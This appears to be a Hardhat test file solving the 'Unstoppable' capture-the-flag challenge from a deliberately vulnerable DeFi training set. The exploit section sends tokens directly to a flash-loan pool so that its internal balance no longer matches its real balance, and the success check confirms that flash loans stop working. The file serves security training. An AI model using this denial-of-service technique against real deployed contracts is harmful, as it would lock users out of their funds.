const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, attacker, someUser] = await ethers.getSigners();

        //this is token contract deployment
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        this.token = await DamnValuableTokenFactory.deploy();

        //this is lender contract deployment
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        //approve the lending contract, to transfer 1M tokens with 18 decimal places.
        await this.token.approve(this.pool.address, TOKENS_IN_POOL);

        //transfer all tokens to the UnstoppableLender contract.
        //this will update the poolBalance
        await this.pool.depositTokens(TOKENS_IN_POOL);

        //add 100 tokens to the attacker.
        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
        this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);

        //this will call UnstoppableLender(pool).flashLoan()
        //executeFlashLoan()
        await this.receiverContract.executeFlashLoan(10);

    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        //both should show same value.
        const val1 = ethers.utils.parseEther('1000000');

        console.log("Pool Balance:     ", (await this.pool.poolBalance()).toString());
        expect(
            await this.pool.poolBalance()
        ).to.equal(val1);

        console.log("lender balance:   ", (await this.token.balanceOf(this.pool.address)).toString());
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(val1);

        console.log("Attacker Balance: ", (await this.token.balanceOf(attacker.address)).toString());
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

        // //execute the attack
        // send some extra tokens to the pool balance
        await this.token.connect(attacker).transfer(this.pool.address, 100);


        // //both should show same value, but they will not have same value.
        // const val2 = ethers.utils.parseEther('1000000');

        // //this will be less than the actual balance.
        // expect(
        //     await this.pool.poolBalance()
        // ).to.equal(val1);

        // //this will be more.
        // expect(
        //     await this.token.balanceOf(this.pool.address)
        // ).to.equal(val1);


    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        //await this.receiverContract.executeFlashLoan(10)

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });

});
